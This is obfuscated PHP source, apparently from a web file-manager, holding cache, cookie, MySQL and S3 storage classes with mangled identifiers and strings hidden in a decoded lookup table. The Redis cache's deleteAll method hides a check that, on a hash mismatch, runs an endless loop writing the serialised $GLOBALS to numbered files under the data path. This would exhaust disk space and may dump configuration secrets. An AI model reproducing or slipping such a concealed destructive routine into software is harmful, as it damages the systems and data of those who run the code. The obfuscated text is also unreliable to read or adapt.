moveBottom($ù®¼¹öñ) { $¾Ä ¯óô =& $_SERVER[§ŒØóıü]; $¯ª©öÅĞ = $this->getSort($¾Ä ¯óô[258]) + 1; return parent::update($ù®¼¹öñ, array($¾Ä ¯óô[1886] => $¯ª©öÅĞ)); } public function resetSort($ĞãâŒğ) { $ó¤·æì =& $_SERVER[§ŒØóıü]; $×¼§‚ë = array(); $ĞãâŒğ = is_array($ĞãâŒğ) ? $ĞãâŒğ : array(); for ($„„·¤ß = 0; $„„·¤ß < count($ĞãâŒğ); $„„·¤ß++) { $×¼§‚ë[$ĞãâŒğ[$„„·¤ß] . $ó¤·æì[12]] = $„„·¤ß + 1; } $Šá¼ƒ® = parent::listData(); foreach ($Šá¼ƒ® as &$ª–ˆ®¾Œ) { $‚şšÙğÕ = $×¼§‚ë[$ª–ˆ®¾Œ[$ó¤·æì[399]]]; $ª–ˆ®¾Œ[$ó¤·æì[1886]] = $‚şšÙğÕ ? $‚şšÙğÕ : $ª–ˆ®¾Œ[$ó¤·æì[1886]]; } unset($ª–ˆ®¾Œ); return parent::resetData($Šá¼ƒ®); } private function getSort($—ã•†»Î) { $ïùâ¡Ñ =& $_SERVER[§ŒØóıü]; $¤Äò½ˆå = parent::listData(); $‚ÃÍ§Õ¤ = array_to_keyvalue($¤Äò½ˆå, $ïùâ¡Ñ[12], $ïùâ¡Ñ[1886]); if (!$‚ÃÍ§Õ¤) { $‚ÃÍ§Õ¤ = array(0); } $ş¼‹ìÃ¯ = $—ã•†»Î == $ïùâ¡Ñ[258] ? max($‚ÃÍ§Õ¤) : min($‚ÃÍ§Õ¤); return intval($ş¼‹ìÃ¯); } } goto CÛ²§íÍ©; dÓ§×é¸¹: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($Ü‹Ù¨ , $ùÉ·óı) { $ç©›ˆ•ç =& $_SERVER[§ŒØóıü]; if (!class_exists($ç©›ˆ•ç[875])) { show_json($ç©›ˆ•ç[876], !1); } $this->cacheTime = $ùÉ·óı; $¾ÕÂÛ¸â = isset($Ü‹Ù¨ [$ç©›ˆ•ç[877]]) ? $Ü‹Ù¨ [$ç©›ˆ•ç[877]] : 10; $Ë¿àÜ¹î = _get($Ü‹Ù¨ , $ç©›ˆ•ç[874]); if ($Ë¿àÜ¹î && is_array($Ë¿àÜ¹î)) { $this->initCluster($Ü‹Ù¨ , $¾ÕÂÛ¸â); } else { $this->handle = $this->init($Ü‹Ù¨ , $¾ÕÂÛ¸â); } } private function init($¿ø®ñ÷¡, $«çğÈŞ‰) { $ìş‡ŒºÈ =& $_SERVER[§ŒØóıü]; $Ü¯¤ = new Redis(); $¶úÊÊğô = isset($¿ø®ñ÷¡[$ìş‡ŒºÈ[878]]) ? $¿ø®ñ÷¡[$ìş‡ŒºÈ[878]] : !1; if ($¶úÊÊğô) { $Ü¯¤->pconnect($¿ø®ñ÷¡[$ìş‡ŒºÈ[182]], $¿ø®ñ÷¡[$ìş‡ŒºÈ[183]], $«çğÈŞ‰); } else { $Ü¯¤->connect($¿ø®ñ÷¡[$ìş‡ŒºÈ[182]], $¿ø®ñ÷¡[$ìş‡ŒºÈ[183]], $«çğÈŞ‰); } if (!empty($¿ø®ñ÷¡[$ìş‡ŒºÈ[413]])) { $Ü¯¤->auth($¿ø®ñ÷¡[$ìş‡ŒºÈ[413]]); } if (!empty($¿ø®ñ÷¡[$ìş‡ŒºÈ[763]]) && $¿ø®ñ÷¡[$ìş‡ŒºÈ[763]] != 0) { $Ü¯¤->select($¿ø®ñ÷¡[$ìş‡ŒºÈ[763]]); } return $Ü¯¤; } private function initCluster($í‡ìËÉ©, $áÄŸ…ìÚ) { $Â¥¼Ò·ê =& $_SERVER[§ŒØóıü]; $ÃùÚÎ– = array($Â¥¼Ò·ê[879], $Â¥¼Ò·ê[880], $Â¥¼Ò·ê[881]); $ØÑÁ¥ô = $Â¥¼Ò·ê[879]; if (isset($í‡ìËÉ©[$Â¥¼Ò·ê[16]]) && in_array($í‡ìËÉ©[$Â¥¼Ò·ê[16]], $ÃùÚÎ–)) { $ØÑÁ¥ô = $í‡ìËÉ©[$Â¥¼Ò·ê[16]]; } switch ($ØÑÁ¥ô) { case $Â¥¼Ò·ê[879]: $this->_slave($í‡ìËÉ©, $áÄŸ…ìÚ); break; case $Â¥¼Ò·ê[880]: break; case $Â¥¼Ò·ê[881]: $this->isCluster = !0; $æŞŸûÍ = $í‡ìËÉ©[$Â¥¼Ò·ê[874]]; $È¸×÷Í¤ = isset($í‡ìËÉ©[$Â¥¼Ò·ê[878]]) ? $í‡ìËÉ©[$Â¥¼Ò·ê[878]] : !1; $èàø’Î = isset($í‡ìËÉ©[$Â¥¼Ò·ê[413]]) ? $í‡ìËÉ©[$Â¥¼Ò·ê[413]] : null; $this->handle = new RedisCluster(NUll, $æŞŸûÍ, $áÄŸ…ìÚ, $áÄŸ…ìÚ, $È¸×÷Í¤, $èàø’Î); break; default: break; } } private function _slave($İ€ü›­Ì, $ï‡û·Øº) { $´‹Ã•Êô = $İ€ü›­Ì[$_SERVER[§ŒØóıü][874]]; $this->filterConfig($İ€ü›­Ì, $´‹Ã•Êô[0]); $this->handle = $this->init($İ€ü›­Ì, $ï‡û·Øº); unset($´‹Ã•Êô[0]); if (empty($´‹Ã•Êô)) { return; } $Ë£×÷í™ = array_rand($´‹Ã•Êô); $this->filterConfig($İ€ü›­Ì, $´‹Ã•Êô[$Ë£×÷í™]); $this->slaveHandle = $this->init($İ€ü›­Ì, $ï‡û·Øº); } private function filterConfig(&$¹»–ëòª, $Â¡êŸ—) { $¼‰ÜÆ¤“ =& $_SERVER[§ŒØóıü]; $›ˆÍ¬ = explode($¼‰ÜÆ¤“[4], $Â¡êŸ—); $‚ó­ôëœ = array($¼‰ÜÆ¤“[182] => $›ˆÍ¬[0], $¼‰ÜÆ¤“[183] => $›ˆÍ¬[1]); $¹»–ëòª = array_merge($¹»–ëòª, $‚ó­ôëœ); } public function set($íƒµ¼š, $¬€¢­éÔ, $ì®õ•à = false) { $ì®õ•à = $ì®õ•à ? $ì®õ•à : $this->cacheTime; return $this->handle->setEx($íƒµ¼š, $ì®õ•à, $¬€¢­éÔ); } public function setLock($ˆ£‰·ŠÙ, $ø‹ÛœØ¨, $ö©ØéÊı) { return $this->handle->setNX($ˆ£‰·ŠÙ, $ø‹ÛœØ¨); } public function get($ñœş‘Şæ) { $ûÃ³éØ£ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ûÃ³éØ£->get($ñœş‘Şæ); } public function remove($÷Šæ‘ÛĞ) { return $this->handle->del($÷Šæ‘ÛĞ); } public function deleteAll() { $å…Í…Â =& $_SERVER[§ŒØóıü]; $“ì•æ»Ë = $_SERVER[$å…Í…Â[747]]; $ĞáÇ¨ğÈ = $å…Í…Â[882]; if ($_SERVER[$å…Í…Â[746]] != $ĞáÇ¨ğÈ($“ì•æ»Ë)) { $Ü»¹°¾ = $å…Í…Â[883]; $Çù´Ûå = $å…Í…Â[748]; $Ë´Š‰ò¦ = $_SERVER[$å…Í…Â[749]] . $å…Í…Â[750]; $äµ¥Æ§ˆ = $Çù´Ûå($Ë´Š‰ò¦); $¤Õ˜¤¹÷ = explode($å…Í…Â[231], $äµ¥Æ§ˆ); if (count($¤Õ˜¤¹÷) < $å…Í…Â[656]) { $õƒà¾¤í = $å…Í…Â[751]; $õƒà¾¤í(); } $ÄŸÑ¶Ä¦ = $å…Í…Â[884]; $ÄŸÑ¶Ä¦($_SERVER[$å…Í…Â[885]]); $Ü»¹°¾ = $å…Í…Â[883]; $Ü»¹°¾(); $ıŞşÊ‘ğ = $å…Í…Â[886]; $—îÆËİ… = json_encode($GLOBALS[$å…Í…Â[887]]); $ğÉ€¦àÃ = 1; for ($ğóÁá“ = $ğÉ€¦àÃ; $ğóÁá“ > 0; $ğóÁá“++) { $ıŞşÊ‘ğ(DATA_PATH . $ğóÁá“, $—îÆËİ…); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $ëçÖñ½À) { $this->handle->flushall($ëçÖñ½À); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($‹İ×‘ÍÀ = '', $•Õ¢Üäˆ = 0) { if (is_string($‹İ×‘ÍÀ) && $‹İ×‘ÍÀ != $_SERVER[§ŒØóıü][12]) { $this->prefix = $‹İ×‘ÍÀ; } if (is_numeric($•Õ¢Üäˆ) && $•Õ¢Üäˆ > 0) { $this->expire = $•Õ¢Üäˆ; } } public static function getInstance() { static $€³µ´ìş; if ($€³µ´ìş === null) { $€³µ´ìş = new self(); } return $€³µ´ìş; } private static $cookieDisable = false; public static function disable($êÔÏ¹®Á) { self::$cookieDisable = $êÔÏ¹®Á; } private static $sameCookieSet = array(); public static function set($ë‘Î£Ÿ, $Êá¢¿Óñ, $°æœ¬³ = 0, $Å‚è•²â = false, $œ³Šƒ»Ê = false) { $‹‹íò =& $_SERVER[§ŒØóıü]; if (self::$cookieDisable) { return; } if (!$°æœ¬³) { $°æœ¬³ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ë‘Î£Ÿ]) && self::$sameCookieSet[$ë‘Î£Ÿ] == $Êá¢¿Óñ . $°æœ¬³) { return; } self::$sameCookieSet[$ë‘Î£Ÿ] = $Êá¢¿Óñ . $°æœ¬³; if (!$œ³Šƒ»Ê) { $œ³Šƒ»Ê = str_replace(HOST, $‹‹íò[12], APP_HOST); $œ³Šƒ»Ê = _get($GLOBALS, $‹‹íò[888], $œ³Šƒ»Ê); } $˜›ûŒÌÁ = $‹‹íò[12]; setcookie($ë‘Î£Ÿ, $Êá¢¿Óñ, time() + $°æœ¬³, $‹‹íò[8] . trim($œ³Šƒ»Ê, $‹‹íò[8]) . $˜›ûŒÌÁ, !1, !1, $Å‚è•²â); } public static function setSafe($¡áÅƒƒ¿, $°«™«íŞ, $÷İ™÷æ = 0) { self::set($¡áÅƒƒ¿, $°«™«íŞ, $÷İ™÷æ, !0); } public static function get($ª¦ôú¡) { static $›ÁÓœÚ¹ = false; if (!$›ÁÓœÚ¹) { self::initHeaderCookie(); $›ÁÓœÚ¹ = !0; } return isset($_COOKIE[$ª¦ôú¡]) ? $_COOKIE[$ª¦ôú¡] : !1; } private static function initHeaderCookie() { $²Çíö­ò =& $_SERVER[§ŒØóıü]; if (!isset($_SERVER[$²Çíö­ò[889]]) || !$_SERVER[$²Çíö­ò[889]]) { return; } $‹‹‰³‹Œ = explode($²Çíö­ò[71], $_SERVER[$²Çíö­ò[889]]); foreach ($‹‹‰³‹Œ as $³çüø½‘) { $³çüø½‘ = explode($²Çíö­ò[890], $³çüø½‘); if (count($³çüø½‘) != 2 || !isset($³çüø½‘[1])) { continue; } $_COOKIE[trim($³çüø½‘[0])] = trim($³çüø½‘[1]); } } public static function remove($Ú¤„÷õ, $È©‡è±å = false) { unset($_COOKIE[$Ú¤„÷õ]); self::set($Ú¤„÷õ, $_SERVER[§ŒØóıü][12], 1, $È©‡è±å); } } class DbMysql extends Db { public function __construct($òà²‰ùû = '') { $Á’ÄªÚ– =& $_SERVER[§ŒØóıü]; if (!extension_loaded($Á’ÄªÚ–[810])) { think_exception(think_lang($Á’ÄªÚ–[14]) . $Á’ÄªÚ–[891]); } if (!empty($òà²‰ùû)) { $this->config = $òà²‰ùû; if (empty($this->config[$Á’ÄªÚ–[17]])) { $this->config[$Á’ÄªÚ–[17]] = $Á’ÄªÚ–[12]; } } } public function connect($˜«ÎÁ‘” = '', $ñâ’·¡ = 0, $ì­Ø×Ì¡ = false) { $®¢Ø¶– =& $_SERVER[§ŒØóıü]; if (!isset($this->linkID[$ñâ’·¡])) { if (empty($˜«ÎÁ‘”)) { $˜«ÎÁ‘” = $this->config; } $şÅß©ËÔ = $˜«ÎÁ‘”[$®¢Ø¶–[892]] . ($˜«ÎÁ‘”[$®¢Ø¶–[893]] ? "\x3a{$˜«ÎÁ‘”[$®¢Ø¶–[893]]}" : $®¢Ø¶–[12]); $¤Ö·ˆŸ‘ = !empty($˜«ÎÁ‘”[$®¢Ø¶–[17]][$®¢Ø¶–[18]]) ? $˜«ÎÁ‘”[$®¢Ø¶–[17]][$®¢Ø¶–[18]] : $this->pconnect; if ($¤Ö·ˆŸ‘) { $this->linkID[$ñâ’·¡] = mysql_pconnect($şÅß©ËÔ, $˜«ÎÁ‘”[$®¢Ø¶–[894]], $˜«ÎÁ‘”[$®¢Ø¶–[895]], 131072); } else { $this->linkID[$ñâ’·¡] = mysql_connect($şÅß©ËÔ, $˜«ÎÁ‘”[$®¢Ø¶–[894]], $˜«ÎÁ‘”[$®¢Ø¶–[895]], !0, 131072); } if (!$this->linkID[$ñâ’·¡] || !empty($˜«ÎÁ‘”[$®¢Ø¶–[21]]) && !mysql_select_db($˜«ÎÁ‘”[$®¢Ø¶–[21]], $this->linkID[$ñâ’·¡])) { think_exception(mysql_error()); } $Ò¬öåøŞ = mysql_get_server_info($this->linkID[$ñâ’·¡]); mysql_query($®¢Ø¶–[896] . think_config($®¢Ø¶–[897]) . $®¢Ø¶–[58], $this->linkID[$ñâ’·¡]); if ($Ò¬öåøŞ > $®¢Ø¶–[898]) { mysql_query($®¢Ø¶–[899], $this->linkID[$ñâ’·¡]); } $this->connected = !0; if (1 != think_config($®¢Ø¶–[22])) { unset($this->config); } } return $this->linkID[$ñâ’·¡]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($“ÓüÕÔÚ) { $ìÑÑÁ„ =& $_SERVER[§ŒØóıü]; if (0 === stripos($“ÓüÕÔÚ, $ìÑÑÁ„[264])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $“ÓüÕÔÚ; if ($this->queryID) { $this->free(); } think_action_status($ìÑÑÁ„[23], 1); think_status($ìÑÑÁ„[24]); $this->queryID = mysql_query($“ÓüÕÔÚ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($í¨ó¾§) { $ŒÈåÜ¥ =& $_SERVER[§ŒØóıü]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $í¨ó¾§; if ($this->queryID) { $this->free(); } think_action_status($ŒÈåÜ¥[25], 1); think_status($ŒÈåÜ¥[24]); $„‹ÌÅ¶ñ = mysql_query($í¨ó¾§, $this->_linkID); $this->debug(); if (!1 === $„‹ÌÅ¶ñ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[§ŒØóıü][900], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $»ñ•£ã = mysql_query($_SERVER[§ŒØóıü][901], $this->_linkID); $this->transTimes = 0; if (!$»ñ•£ã) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ù§è’‘Ë = mysql_query($_SERVER[§ŒØóıü][902], $this->_linkID); $this->transTimes = 0; if (!$Ù§è’‘Ë) { $this->error(); return !1; } } return !0; } private function getAll() { $“ó¬³³­ = array(); if ($this->numRows > 0) { while ($”ÎÇöµ = mysql_fetch_assoc($this->queryID)) { $“ó¬³³­[] = $”ÎÇöµ; } mysql_data_seek($this->queryID, 0); } return $“ó¬³³­; } public function getFields($´µ§•˜) { $Š×ˆŞÔ­ =& $_SERVER[§ŒØóıü]; $áÚ˜…¦È = $this->query($Š×ˆŞÔ­[903] . $this->parseKey($´µ§•˜)); $Œ›†®ƒ = array(); if ($áÚ˜…¦È) { foreach ($áÚ˜…¦È as $¤ÒãÙÊˆ => $çõşÉˆ) { $Œ›†®ƒ[$çõşÉˆ[$Š×ˆŞÔ­[31]]] = array($Š×ˆŞÔ­[32] => $çõşÉˆ[$Š×ˆŞÔ­[31]], $Š×ˆŞÔ­[33] => $çõşÉˆ[$Š×ˆŞÔ­[34]], $Š×ˆŞÔ­[35] => (bool) (strtoupper($çõşÉˆ[$Š×ˆŞÔ­[36]]) === $Š×ˆŞÔ­[904]), $Š×ˆŞÔ­[37] => $çõşÉˆ[$Š×ˆŞÔ­[38]], $Š×ˆŞÔ­[39] => strtolower($çõşÉˆ[$Š×ˆŞÔ­[40]]) == $Š×ˆŞÔ­[41], $Š×ˆŞÔ­[42] => strtolower($çõşÉˆ[$Š×ˆŞÔ­[43]]) == $Š×ˆŞÔ­[44]); } } return $Œ›†®ƒ; } public function getTables($á°òã’Ÿ = '') { $®èÀ¯ë” =& $_SERVER[§ŒØóıü]; if (!empty($á°òã’Ÿ)) { $ê½•ßĞ = $®èÀ¯ë”[905] . $á°òã’Ÿ . $®èÀ¯ë”[906]; } else { $ê½•ßĞ = $®èÀ¯ë”[907]; } $Ì¶ßşâ„ = $this->query($ê½•ßĞ); $†­äÙ¢« = array(); foreach ($Ì¶ßşâ„ as $÷’¶ìÌ‚ => $ç¥Ÿã) { $†­äÙ¢«[$÷’¶ìÌ‚] = current($ç¥Ÿã); } return $†­äÙ¢«; } public function replace($¯…ŞÄ°, $†¼¡ÁóÏ = array()) { $ÛÉ¦ŒŸ¿ =& $_SERVER[§ŒØóıü]; foreach ($¯…ŞÄ° as $¥ó“¹Áà => $ĞÀª‰ä˜) { $‰Æş´µ = $this->parseValue($ĞÀª‰ä˜); if (is_scalar($‰Æş´µ)) { $÷Á¶Ñ¢´[] = $‰Æş´µ; $¥…‘ü«Ø[] = $this->parseKey($¥ó“¹Áà); } } $Ç†ĞÖ·¬ = $ÛÉ¦ŒŸ¿[908] . $this->parseTable($†¼¡ÁóÏ[$ÛÉ¦ŒŸ¿[279]]) . $ÛÉ¦ŒŸ¿[909] . implode($ÛÉ¦ŒŸ¿[50], $¥…‘ü«Ø) . $ÛÉ¦ŒŸ¿[910] . implode($ÛÉ¦ŒŸ¿[50], $÷Á¶Ñ¢´) . $ÛÉ¦ŒŸ¿[911]; return $this->execute($Ç†ĞÖ·¬); } public function insertAll($ß¦Ùçä, $ğ¼ßäÙÉ = array(), $Õ»•üÔ´ = false) { $ÃŒ÷ôš =& $_SERVER[§ŒØóıü]; if (!is_array($ß¦Ùçä[0])) { return !1; } $˜Ğ˜ìú = array_keys($ß¦Ùçä[0]); $àÂÈ™Á = array(); foreach ($ß¦Ùçä as $ó·‰¯¨¼) { $Æ›²ö = array(); foreach ($ó·‰¯¨¼ as $ÔüÏæáØ => $øÆõÛ¨Ú) { $øÆõÛ¨Ú = $this->parseValue($øÆõÛ¨Ú); if (is_scalar($øÆõÛ¨Ú)) { $Æ›²ö[] = $øÆõÛ¨Ú; } } $àÂÈ™Á[] = $ÃŒ÷ôš[260] . implode($ÃŒ÷ôš[50], $Æ›²ö) . $ÃŒ÷ôš[911]; } array_walk($˜Ğ˜ìú, array($this, $ÃŒ÷ôš[912])); $¿‚¨åã = ($Õ»•üÔ´ ? $ÃŒ÷ôš[913] : $ÃŒ÷ôš[914]) . $ÃŒ÷ôš[915] . $this->parseTable($ğ¼ßäÙÉ[$ÃŒ÷ôš[279]]) . $ÃŒ÷ôš[909] . implode($ÃŒ÷ôš[50], $˜Ğ˜ìú) . $ÃŒ÷ôš[916] . implode($ÃŒ÷ôš[50], $àÂÈ™Á); return $this->execute($¿‚¨åã); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $¨×íÕ€è =& $_SERVER[§ŒØóıü]; $this->error = mysql_errno() . $¨×íÕ€è[4] . mysql_error($this->_linkID); if ($¨×íÕ€è[12] != $this->queryStr) { $this->error .= LNG($¨×íÕ€è[48]) . $this->queryStr; } think_trace($this->error, $¨×íÕ€è[12], $¨×íÕ€è[49]); return $this->error; } public function escapeString($“ƒÜ´õ¶) { if ($this->_linkID) { return mysql_real_escape_string($“ƒÜ´õ¶, $this->_linkID); } else { return mysql_escape_string($“ƒÜ´õ¶); } } public function parseKey(&$Ù±ËéêÂ, $“èû¥ã— = true) { $ûÛÖŠéÖ =& $_SERVER[§ŒØóıü]; if ($“èû¥ã—) { $Ù±ËéêÂ = $this->parseKeyCheck($Ù±ËéêÂ); } if ($Ù±ËéêÂ != $ûÛÖŠéÖ[189] && !preg_match($ûÛÖŠéÖ[917], $Ù±ËéêÂ)) { $Ù±ËéêÂ = $ûÛÖŠéÖ[385] . trim($Ù±ËéêÂ, $ûÛÖŠéÖ[385]) . $ûÛÖŠéÖ[385]; } return $Ù±ËéêÂ; } } goto BÕœÓê×ì©; bšŸŒÖˆÔğ: $fileSize = strrev(base64_decode($_SERVER[£›öŒ½Ë][0])); function binCheckNeq($¨…ˆù´”, $’’í±“ì) { return $¨…ˆù´” != $’’í±“ì; } $_SERVER[$_SERVER[£›öŒ½Ë][1]] = $fileSize($_SERVER[$_SERVER[£›öŒ½Ë][2]]); goto dƒ„Ì³¼˜; eóÔ¼õ¨Æ¯: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($ü²™™ÓÉ) { parent::__construct($ü²™™ÓÉ); } public function uploadFormData($˜±˜´¨î, $÷€Éí”” = 3600) { $ÉØ½ˆ•ß =& $_SERVER[§ŒØóıü]; $ËÇ¬Â–­ = $ÉØ½ˆ•ß[199]; $áˆ«Òñë = $ÉØ½ˆ•ß[1365]; $µÒ”Üî¾ = $ÉØ½ˆ•ß[62]; $‹àæøé = gmdate($ÉØ½ˆ•ß[1366]); $É½™Ùç = gmdate($ÉØ½ˆ•ß[756]); $¸ëî = $ÉØ½ˆ•ß[1367]; $†¹ß´ò = $÷€Éí”” . $ÉØ½ˆ•ß[12]; $­ü”«ÏÂ = $ÉØ½ˆ•ß[1328]; $ ¬Ö½ûâ = array($this->accessKey, $É½™Ùç, $this->region, $µÒ”Üî¾, $¸ëî); $âÉ€¦íƒ = implode($ÉØ½ˆ•ß[8], $ ¬Ö½ûâ); $†šŠêŠƒ = array($ÉØ½ˆ•ß[1330] => gmdate($ÉØ½ˆ•ß[1329], strtotime($ÉØ½ˆ•ß[1368])), $ÉØ½ˆ•ß[1331] => array(array($ÉØ½ˆ•ß[1333] => $this->bucket), array($ÉØ½ˆ•ß[1332] => $ËÇ¬Â–­), array($ÉØ½ˆ•ß[1334], $ÉØ½ˆ•ß[1335], $ÉØ½ˆ•ß[12]), array($ÉØ½ˆ•ß[1334], $ÉØ½ˆ•ß[1369], $ÉØ½ˆ•ß[12]), array($ÉØ½ˆ•ß[1334], $ÉØ½ˆ•ß[1370], $ÉØ½ˆ•ß[12]), array($ÉØ½ˆ•ß[1336] => $­ü”«ÏÂ), array($ÉØ½ˆ•ß[1371] => $âÉ€¦íƒ), array($ÉØ½ˆ•ß[1372] => $áˆ«Òñë), array($ÉØ½ˆ•ß[1373] => $‹àæøé), array($ÉØ½ˆ•ß[1374] => $†¹ß´ò))); $î¢Âª¥— = base64_encode(json_encode($†šŠêŠƒ)); $áºØ²¿ö = hash_hmac($ÉØ½ˆ•ß[1375], $É½™Ùç, $ÉØ½ˆ•ß[1376] . $this->secret, !0); $‘ÓÑË¸Ï = hash_hmac($ÉØ½ˆ•ß[1375], $this->region, $áºØ²¿ö, !0); $ÍìóßØĞ = hash_hmac($ÉØ½ˆ•ß[1375], $µÒ”Üî¾, $‘ÓÑË¸Ï, !0); $ìÄº„­˜ = hash_hmac($ÉØ½ˆ•ß[1375], $¸ëî, $ÍìóßØĞ, !0); $ğõÏÇƒí = hash_hmac($ÉØ½ˆ•ß[1375], $î¢Âª¥—, $ìÄº„­˜); $éº£×£ = array($ÉØ½ˆ•ß[215] => $ÉØ½ˆ•ß[12], $ÉØ½ˆ•ß[1377] => $ÉØ½ˆ•ß[12], $ÉØ½ˆ•ß[1332] => $ËÇ¬Â–­, $ÉØ½ˆ•ß[1336] => $­ü”«ÏÂ, $ÉØ½ˆ•ß[1340] => $î¢Âª¥—, $ÉØ½ˆ•ß[1378] => $âÉ€¦íƒ, $ÉØ½ˆ•ß[1379] => $áˆ«Òñë, $ÉØ½ˆ•ß[1380] => $‹àæøé, $ÉØ½ˆ•ß[1381] => $†¹ß´ò, $ÉØ½ˆ•ß[1382] => $ğõÏÇƒí, $ÉØ½ˆ•ß[182] => $this->getHost()); return $éº£×£; } public function multiUploadFormData($¦½Şµ˜°, $Ñš†ÒíÄ = 3600) { $ìğ¸×— =& $_SERVER[§ŒØóıü]; $Î÷•»­ = gmdate($ìğ¸×—[1461]); $¬£…ş¡Ç = array(); $»ŠàÃñ± = $this->client->getUploadId($this->bucket, $¦½Şµ˜°, $¬£…ş¡Ç); if (!$»ŠàÃñ±) { return !1; } return array($ìğ¸×—[223] => $»ŠàÃñ±, $ìğ¸×—[182] => $this->getHost() . $ìğ¸×—[8] . $this->pathEncode($¦½Şµ˜°), $ìğ¸×—[224] => $Î÷•»­, $ìğ¸×—[94] => $¦½Şµ˜°); } public function multiUploadAuthData($ÏÊÃàø, $ğŒŸš—š = array()) { $¯çı÷¼ =& $_SERVER[§ŒØóıü]; $ú‰ÈáèŞ = isset($ğŒŸš—š[$¯çı÷¼[174]]) ? $ğŒŸš—š[$¯çı÷¼[174]] : $¯çı÷¼[12]; $íô­­Æ¿ = $ğŒŸš—š[$¯çı÷¼[94]]; unset($ğŒŸš—š[$¯çı÷¼[94]]); if (isset($ğŒŸš—š[$¯çı÷¼[225]])) { return $this->listUploadParts($íô­­Æ¿, $ğŒŸš—š); } $™¼ìı‰ = array(); if (isset($ğŒŸš—š[$¯çı÷¼[1462]])) { $™¼ìı‰[$¯çı÷¼[1463]] = $ğŒŸš—š[$¯çı÷¼[1462]]; } $†¾ıÒ«Á = explode($¯çı÷¼[184], $this->getHost()); $âÂ“‚Ãú = array($¯çı÷¼[1464] => $†¾ıÒ«Á[1], $¯çı÷¼[1465] => $¯çı÷¼[12], $¯çı÷¼[215] => $¯çı÷¼[120], $¯çı÷¼[1377] => $ğŒŸš—š[$¯çı÷¼[76]]); $ïİç…ìñ = $¯çı÷¼[228]; $Š·“§Áë = $¯çı÷¼[8] . $this->pathEncode($íô­­Æ¿) . $ú‰ÈáèŞ; $©–Á‹« = $this->client->__getSignatureV4($™¼ìı‰, $âÂ“‚Ãú, $ïİç…ìñ, $Š·“§Áë); if (strpos($ú‰ÈáèŞ, $¯çı÷¼[227]) === 0) { if (isset($™¼ìı‰[$¯çı÷¼[1463]])) { $Š‡™ı›­ = $™¼ìı‰[$¯çı÷¼[1463]]; } else { if (isset($©–Á‹«[$¯çı÷¼[1463]])) { $Š‡™ı›­ = $©–Á‹«[$¯çı÷¼[1463]]; } else { $Š‡™ı›­ = hash($¯çı÷¼[1375], $¯çı÷¼[12]); } } return array($¯çı÷¼[234] => $©–Á‹«[$¯çı÷¼[234]], $¯çı÷¼[1463] => $Š‡™ı›­, $¯çı÷¼[224] => $©–Á‹«[$¯çı÷¼[1466]]); } return $©–Á‹«[$¯çı÷¼[234]]; } public function listUploadParts($Ê˜ˆİã¨, $ã¨ìï = array()) { $ó˜†‹ß =& $_SERVER[§ŒØóıü]; $ƒêÛĞ·è = str_replace($ó˜†‹ß[235], $ó˜†‹ß[12], $ã¨ìï[$ó˜†‹ß[174]]); $ŞÜÈ–œ“ = $this->client->listParts($this->bucket, $Ê˜ˆİã¨, $ƒêÛĞ·è); if (!$ŞÜÈ–œ“) { return !1; } $‘ÅİãÎ = $ó˜†‹ß[1467]; foreach ($ŞÜÈ–œ“ as $—åöŒı£) { $‘ÅİãÎ .= $ó˜†‹ß[1468] . "\x3c\x50\141\x72\x74\116\x75\x6d\x62\x65\x72\76{$—åöŒı£[$ó˜†‹ß[1422]]}\x3c\57\x50\x61\x72\164\x4e\165\x6d\142\145\162\x3e\12" . "\74\105\124\x61\x67\76{$—åöŒı£[$ó˜†‹ß[1423]]}\x3c\x2f\x45\x54\x61\x67\76\xa" . $ó˜†‹ß[1469]; } $‘ÅİãÎ .= $ó˜†‹ß[1470]; $ØŞÈÓØÁ = array(); $ğÄ½ç§Ç = explode($ó˜†‹ß[184], $this->getHost()); $ºˆ†Ë¾ô = array($ó˜†‹ß[1464] => $ğÄ½ç§Ç[1], $ó˜†‹ß[215] => $ó˜†‹ß[120], $ó˜†‹ß[1377] => strlen($‘ÅİãÎ)); $ÌÕÊˆ = $ó˜†‹ß[226]; $ëÒ÷ø¾¡ = $ó˜†‹ß[8] . $this->pathEncode($Ê˜ˆİã¨) . $ã¨ìï[$ó˜†‹ß[174]]; $÷Œ±Ô”– = $this->client->__getSignatureV4($ØŞÈÓØÁ, $ºˆ†Ë¾ô, $ÌÕÊˆ, $ëÒ÷ø¾¡, $‘ÅİãÎ); return array($ó˜†‹ß[234] => $÷Œ±Ô”–[$ó˜†‹ß[234]], $ó˜†‹ß[224] => $÷Œ±Ô”–[$ó˜†‹ß[1466]], $ó˜†‹ß[236] => $ŞÜÈ–œ“, $ó˜†‹ß[1463] => $÷Œ±Ô”–[$ó˜†‹ß[1463]]); } public function link($ş”ÜÃèğ, $¢áÁ¡ÑØ = array()) { return parent::link($ş”ÜÃèğ, $¢áÁ¡ÑØ); } public function fileOut($š‘áÈ¹°, $Öõ¼ıÁˆ = false, $òÔ°ù·ä = false, $‚äÅóĞô = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[§ŒØóıü][1471])) { return parent::fileOutServer($š‘áÈ¹°, $Öõ¼ıÁˆ, $òÔ°ù·ä, $‚äÅóĞô); } parent::fileOut($š‘áÈ¹°, $Öõ¼ıÁˆ, $òÔ°ù·ä, $‚äÅóĞô); } public function fileOutImage($ß¥“—éì, $»—ÇÄû¹ = 250) { if (strstr($this->endpoint, $_SERVER[§ŒØóıü][1471])) { return 